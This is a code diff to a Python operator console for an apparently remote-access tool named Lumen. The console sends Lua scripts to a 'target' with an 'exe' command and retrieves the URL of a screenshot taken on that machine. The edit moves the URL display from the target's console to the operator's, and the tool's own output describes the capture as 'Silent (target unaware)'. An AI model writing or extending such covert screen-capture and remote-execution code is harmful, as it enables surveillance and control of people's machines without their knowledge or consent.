@@ -1272,7 +1272,6 @@ end)
     # Retrieve the URL
     retrieve_script = """
 local url = _G.LUMEN_SCREENSHOT_URL or "PENDING"
-print("LUMEN_URL:" .. url)
 return url
 """
 
@@ -1281,13 +1280,16 @@ return url
     else:
         url_result = send_command(target_id, "exe", {"script": retrieve_script})
 
+    url = "PENDING"
+    if url_result.get("success"):
+        url = url_result.get("data", "PENDING")
+
     print(f"  \033[38;5;141m✓ Screenshot captured successfully!\033[0m\n")
     print(f"  \033[38;5;93m→ Target: {target_id}\033[0m")
     print(f"  \033[38;5;93m→ Resolution: 854x480\033[0m")
     print(f"  \033[38;5;93m→ Method: Silent (target unaware)\033[0m\n")
-    print(f"  \033[38;5;135m📸 Screenshot URL:\033[0m")
-    print(f"  \033[38;5;141m→ Check the target's console output or wait a moment\033[0m")
-    print(f"  \033[38;5;141m→ URL will be displayed when upload completes\033[0m\n")
+    print(f"  \033[38;5;135mScreenshot URL:\033[0m")
+    print(f"  \033[38;5;141m→ {url}\033[0m\n")
     print(f"  \033[38;5;93m💡 Note: The URL is stored in _G.LUMEN_SCREENSHOT_URL on target\033[0m")
 
     input("\n  Press Enter to continue...")
